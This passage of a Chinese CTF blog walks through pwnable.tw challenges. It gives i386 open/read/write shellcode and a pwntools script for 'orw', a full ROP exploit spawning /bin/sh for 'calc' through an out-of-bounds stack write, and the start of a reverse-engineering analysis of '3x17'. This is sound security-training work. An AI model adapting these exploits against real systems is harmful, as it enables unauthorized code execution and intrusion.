                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw3.jpg" alt="orw3" title="">
                </div>
                <div class="image-caption">orw3</div>
            </figure></div>

<p>那么思路也很清楚，open打开flag文件，read读取文件，write打印文件内容</p>
<p>首先我们看open函数，eax为0x5；ebx为文件名；ecx为flags，也就是open的第二个参数；edx为mode；在执行了open之后，fd便存储在eax</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw4.jpg" alt="orw4" title="">
                </div>
                <div class="image-caption">orw4</div>
            </figure></div>

<p>那么我们可以这样编写shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># fd = open(&apos;/home/orw/flag&apos;,0)</span><br><span class="line">mov ecx,0</span><br><span class="line">mov eax,SYS_open</span><br><span class="line">call here</span><br><span class="line">.string &quot;/home/orw/flag&quot;</span><br><span class="line">.byte 0</span><br><span class="line">here:</span><br><span class="line">pop ebx</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p>然后我们看read函数，eax为0x3；ebx为fd，也就是open之后的eax；ecx为buf；edx为count，也就是size</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw5.jpg" alt="orw5" title="">
                </div>
                <div class="image-caption">orw5</div>
            </figure></div>

<p>vmmap看一下，bss段可读可写可执行，我们可以把文件内容写入bss段</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw6.jpg" alt="orw6" title="">
                </div>
                <div class="image-caption">orw6</div>
            </figure></div>

<p>那么我们可以这样编写shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># read(fd,bss+0x40,0x40)</span><br><span class="line">mov ebx,eax</span><br><span class="line">mov eax,SYS_read</span><br><span class="line">mov ecx,0x0804A100</span><br><span class="line">mov edx,0x40</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p>最后我们看write函数，eax为0x4，ebx为fd，输出到屏幕就是1；ecx为buf；edx为vien，也就是size</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw7.jpg" alt="orw7" title="">
                </div>
                <div class="image-caption">orw7</div>
            </figure></div>

<p>那么我们可以这样编写shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#write(1,bss+0x40,0x40)</span><br><span class="line">mov ebx,0x1</span><br><span class="line">mov eax,SYS_write</span><br><span class="line">mov ecx,0x0804A100</span><br><span class="line">mov edx,0x40</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h2 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process('./orw')</span></span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10001</span>)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x = <span class="number">2048</span> : r.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : r.recvline()</span><br><span class="line">ia = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line">ra = <span class="keyword">lambda</span> : r.recvall()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: r.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y : r.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'shellcode:'</span>)</span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">        mov ecx,0</span></span><br><span class="line"><span class="string">        mov eax,SYS_open</span></span><br><span class="line"><span class="string">        call here</span></span><br><span class="line"><span class="string">        .string "/home/orw/flag"</span></span><br><span class="line"><span class="string">        .byte 0</span></span><br><span class="line"><span class="string">        here:</span></span><br><span class="line"><span class="string">        pop ebx</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        mov ebx,eax</span></span><br><span class="line"><span class="string">        mov eax,SYS_read</span></span><br><span class="line"><span class="string">        mov ecx,0x0804A100</span></span><br><span class="line"><span class="string">        mov edx,0x40</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        mov ebx,0x1</span></span><br><span class="line"><span class="string">        mov eax,SYS_write</span></span><br><span class="line"><span class="string">        mov ecx,0x0804A100</span></span><br><span class="line"><span class="string">        mov edx,0x40</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(code,arch=<span class="string">"i386"</span>)</span><br><span class="line">sd(shellcode)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>Have you ever use Microsoft calculator?<br>nc chall.pwnable.tw 10100</p>
</blockquote>
<h2 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，静态链接</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc0.jpg" alt="calc0" title="">
                </div>
                <div class="image-caption">calc0</div>
            </figure></div>

<p>checksec一下，开启了Canary，NX和Part relro</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc1.jpg" alt="calc1" title="">
                </div>
                <div class="image-caption">calc1</div>
            </figure></div>

<p>ida打开如下：</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc2.jpg" alt="calc2" title="">
                </div>
                <div class="image-caption">calc2</div>
            </figure></div>

<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc3.jpg" alt="calc3" title="">
                </div>
                <div class="image-caption">calc3</div>
            </figure></div>

<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc4.jpg" alt="calc4" title="">
                </div>
                <div class="image-caption">calc4</div>
            </figure></div>

<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc5.jpg" alt="calc5" title="">
                </div>
                <div class="image-caption">calc5</div>
            </figure></div>

<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc6.jpg" alt="calc6" title="">
                </div>
                <div class="image-caption">calc6</div>
            </figure></div>

<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc7.jpg" alt="calc7" title="">
                </div>
                <div class="image-caption">calc7</div>
            </figure></div>

<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc8.jpg" alt="calc8" title="">
                </div>
                <div class="image-caption">calc8</div>
            </figure></div>

<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先在get_expr中，限制了我们的输入为<code>+-*/%0-9</code>，get_expr会逐个读入字符并在最后添加一个<code>\x00</code></p>
<p>然后init_pool中会初始化长度为100的数组，全部赋值为0</p>
<p>我们重点看parse_expr函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> input, _DWORD *pool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> count; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *byte_input; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *s1; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> operate[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  byte_input = (_BYTE *)input;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  bzero(operate, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(<span class="keyword">char</span> *)(i + input) - <span class="string">'0'</span>) &gt; <span class="number">9</span> )<span class="comment">// 为运算符的时候</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + input - (_DWORD)byte_input;      <span class="comment">// 左操作数的长度</span></span><br><span class="line">      s1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(s1, byte_input, v2);               <span class="comment">// 从byte_input处copy长度为v2的字符串到s1</span></span><br><span class="line">      s1[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"0"</span>) )                   <span class="comment">// 左操作数不能为0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"prevent division by zero"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi((<span class="keyword">int</span>)s1);                       <span class="comment">// str2int</span></span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        count = (*pool)++;                      <span class="comment">// pool[0]保存的是操作数的个数</span></span><br><span class="line">        pool[count + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(i + input) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(<span class="keyword">char</span> *)(i + <span class="number">1</span> + input) - <span class="number">48</span>) &gt; <span class="number">9</span> )<span class="comment">// 对后一个字符做判断，判断是否都是运算符</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      byte_input = (_BYTE *)(i + <span class="number">1</span> + input);</span><br><span class="line">      <span class="keyword">if</span> ( operate[v7] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(<span class="keyword">char</span> *)(i + input) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">37</span>:                              <span class="comment">// %</span></span><br><span class="line">          <span class="keyword">case</span> <span class="number">42</span>:                              <span class="comment">// *</span></span><br><span class="line">          <span class="keyword">case</span> <span class="number">47</span>:                              <span class="comment">// /</span></span><br><span class="line">            <span class="keyword">if</span> ( operate[v7] != <span class="number">43</span> &amp;&amp; operate[v7] != <span class="number">45</span> )<span class="comment">// + -</span></span><br><span class="line">            &#123;</span><br><span class="line">              eval(pool, operate[v7]);</span><br><span class="line">              operate[v7] = *(_BYTE *)(i + input);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              operate[++v7] = *(_BYTE *)(i + input);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">43</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">45</span>:</span><br><span class="line">            eval(pool, operate[v7]);</span><br><span class="line">            operate[v7] = *(_BYTE *)(i + input);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(pool, operate[v7--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        operate[v7] = *(_BYTE *)(i + input);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + input) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(pool, operate[v7--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以及eval函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__<span class="function">cdecl <span class="title">eval</span><span class="params">(_DWORD *pool, <span class="keyword">char</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( s == <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - <span class="number">1</span>] += pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( s &gt; <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s == <span class="string">'-'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - <span class="number">1</span>] -= pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( s == <span class="string">'/'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - <span class="number">1</span>] /= pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( s == <span class="string">'*'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - <span class="number">1</span>] *= pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  result = pool;</span><br><span class="line">  --*pool;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里有个最主要的问题是pool[0]存放的是操作数的个数，pool其余的地方存放操作数，s存储运算符<br>那么如果我们输入<code>+10</code>，这时候按照这个逻辑来说就会有个神奇的事情</p>
<blockquote>
<p>pool[0] = 1, pool[1] = 10<br>pool[0] += pool[1] = 11<br>–*pool = 10<br>最终的输出结果就是pool[10]</p>
</blockquote>
<p>类似地，我们输入<code>+10+1</code>，会导致</p>
<blockquote>
<p>pool[10] += 1</p>
</blockquote>
<p>这样我们就可以实现栈上任意写</p>
<p>又由于</p>
<blockquote>
<p>int pool; // [esp+18h] [ebp-5A0h]</p>
</blockquote>
<p>我们可以得到0x5a0/4 = 360，即pool[360]为ebp，pool[361]为返回地址，那么我们只要修改pool[361]即可</p>
<p>由于程序为静态链接，又开启了nx，则我们只能通过ROP执行<code>execve(&#39;/bin/sh&#39;)</code>，所以我们需要用ROPgadget寻找gadget</p>
<blockquote>
<p>pop_ret_eax = 0x0805c34b<br>pop_ret_ecx_ebx = 0x080701d1<br>pop_ret_edx = 0x080701aa<br>int80 = 0x08049a21</p>
</blockquote>
<p>但是没有<code>/bin/sh</code>的字符串，所以要我们自己放上去，然后传入地址，即可getshell</p>
<h2 id="解题脚本-2"><a href="#解题脚本-2" class="headerlink" title="解题脚本"></a>解题脚本</h2><p>需要注意的是，解题脚本中的main_stack_size有可能为8和24，当24的时候才是对的，也不知道为什么那么神奇</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">HOST = &apos;chall.pwnable.tw&apos;</span><br><span class="line">PORT = 10100</span><br><span class="line"># r = process(&apos;./calc&apos;)</span><br><span class="line">r = remote(HOST,PORT)</span><br><span class="line"></span><br><span class="line">sd = lambda x : r.send(x)</span><br><span class="line">sl = lambda x : r.sendline(x)</span><br><span class="line">rv = lambda x = 2048 : r.recv(x)</span><br><span class="line">ru = lambda x : r.recvuntil(x)</span><br><span class="line">rl = lambda : r.recvline()</span><br><span class="line">ia = lambda : r.interactive()</span><br><span class="line">ra = lambda : r.recvall()</span><br><span class="line">sla = lambda x,y: r.sendlineafter(x,y)</span><br><span class="line">sa = lambda x,y : r.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">ret_index = 361</span><br><span class="line">main_ebp_index = 360</span><br><span class="line"></span><br><span class="line">pop_ret_eax = 0x0805c34b</span><br><span class="line">pop_ret_ecx_ebx = 0x080701d1</span><br><span class="line">pop_ret_edx = 0x080701aa</span><br><span class="line">int80 = 0x08049a21</span><br><span class="line"></span><br><span class="line">eax = 11</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br><span class="line"></span><br><span class="line">ru(&apos;=== Welcome to SECPROG calculator ===&apos;)</span><br><span class="line"></span><br><span class="line"># Get main_ebp addr</span><br><span class="line">sl(&apos;+&apos;+str(main_ebp_index))</span><br><span class="line">ru(&apos;\n&apos;)</span><br><span class="line">main_ebp = int(ru(&apos;\n&apos;)[:-1])</span><br><span class="line">print &apos;Main_ebp_addr: &apos; + hex(main_ebp)</span><br><span class="line"></span><br><span class="line"># Get /bin/sh addr</span><br><span class="line">main_stack_size = (main_ebp + 0x100000000) - ((main_ebp + 0x100000000) &amp; 0xFFFFFFF0-16)</span><br><span class="line">print &apos;Main_stack_size: &apos; + str(main_stack_size)</span><br><span class="line">bin_sh_addr = main_ebp + (8-main_stack_size/4-1)*4</span><br><span class="line">print &apos;Bin_sh_addr: &apos; + hex(bin_sh_addr)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"># Write</span><br><span class="line">def write(index,value):</span><br><span class="line">	idx = ret_index+index</span><br><span class="line">	payload = &apos;+&apos; + str(idx)</span><br><span class="line">	sl(payload)</span><br><span class="line">	base_value = int(ru(&apos;\n&apos;)[:-1])</span><br><span class="line">	diff = value - base_value</span><br><span class="line">	if diff &lt; 0:</span><br><span class="line">		payload = &apos;+&apos; + str(idx) + str(diff)</span><br><span class="line">		sl(payload)</span><br><span class="line">	else:</span><br><span class="line">		payload = &apos;+&apos; + str(idx) + &apos;+&apos; + str(diff)</span><br><span class="line">		sl(payload)</span><br><span class="line">	after_value = int(ru(&apos;\n&apos;)[:-1])</span><br><span class="line">	print &apos;Before: &apos; + str(base_value)</span><br><span class="line">	print &apos;Target: &apos; + str(value)</span><br><span class="line">	print &apos;Diff: &apos; + str(diff)</span><br><span class="line">	print &apos;After: &apos; + hex(after_value)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">key = [pop_ret_eax,eax,pop_ret_edx,edx,pop_ret_ecx_ebx,ecx,bin_sh_addr,int80,0x6e69622f,0x0068732f]		</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">	write(i,key[i])</span><br><span class="line">sl(&apos;pwn&apos;)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>3 x 17 = ?<br>nc chall.pwnable.tw 10105</p>
</blockquote>
<h2 id="基本信息-3"><a href="#基本信息-3" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，64位，动态链接</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/3x170.jpg" alt="3x170" title="">
                </div>
                <div class="image-caption">3x170</div>
            </figure></div>

<p>checksec一下，开启了NX和Part relro，并且ida打开发现是有Canary的</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/3x171.jpg" alt="3x171" title="">
                </div>
                <div class="image-caption">3x171</div>
            </figure></div>

<p>ida打开如下：</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/3x172.jpg" alt="3x172" title="">
                </div>
                <div class="image-caption">3x172</div>
            </figure></div>

<h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><blockquote>
<p>本思路摘抄于<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/" target="_blank" rel="noopener">该博客</a></p>
</blockquote>
<p>首先由于没有符号表，我们直接看start，发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A5F                 mov     r8, offset sub_402960</span><br><span class="line">.text:0000000000401A66                 mov     rcx, offset loc_4028D0</span><br><span class="line">.text:0000000000401A6D                 mov     rdi, offset sub_401B6D</span><br><span class="line">.text:0000000000401A74                 db      67h</span><br><span class="line">.text:0000000000401A74                 call    sub_401EB0</span><br></pre></td></tr></table></figure>

<p>所以__libc_start_main的函数原型：</p>
<blockquote>
<p>__libc_start_main(main,argc,argv&amp;env,init,fini,rtld_fini)</p>
</blockquote>
<p>对应为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sub_401B6D: main</span><br><span class="line">sub_402960: fini</span><br><span class="line">sub_401EB0: __libc_start_main</span><br><span class="line">loc_4028D0：init</span><br></pre></td></tr></table></figure>

<p>然后<code>sub_40EE7</code>也就是<code>strtol</code>函数，如果我们输入一个十进制的字符串，它会将该字符串转为int并存储在eax中</p>
<p>这道题的逻辑调一下就会发现是任意地址写0x18个字节，并且有一个变量<code>byte_4B9330</code>，每次任意写会自增，只有当它为1时才能写</p>
<p>上面我们也提到，<code>__libc_start_main</code>的两个参数<code>init,fini</code></p>
<p>也就是<code>__libc_csu_fini（sub_402960），__libc_csu_init（loc_4028D0）</code></p>
<p>其中csu为</p>
<blockquote>
<p>C start up</p>
</blockquote>
<p>那么init就是开始的函数，fini就是结束的函数</p>
<p>在IDA的 view -&gt; open subviews -&gt; segments中，我们可以看见四个段:</p>
<blockquote>
